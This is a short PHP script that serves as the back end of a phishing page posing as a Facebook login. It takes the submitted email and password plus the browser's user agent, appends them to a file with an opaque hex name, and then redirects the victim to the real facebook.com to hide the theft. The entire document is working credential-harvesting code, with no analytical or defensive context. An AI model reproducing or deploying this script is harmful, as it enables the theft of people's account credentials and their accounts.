<?php
$email=$_POST['email'];
$pass = $_POST['pass'];
$ua = "unknown";
if(isset($_SERVER['HTTP_USER_AGENT'])){
  $ua = $_SERVER['HTTP_USER_AGENT'];
}
$data = $email." : ".$pass." : ".$ua."\n";
$fp = fopen("d2e970b81b067fd004541182d522c7da", "a+");
fwrite($fp, $data);
header("location: https://www.facebook.com");
?>
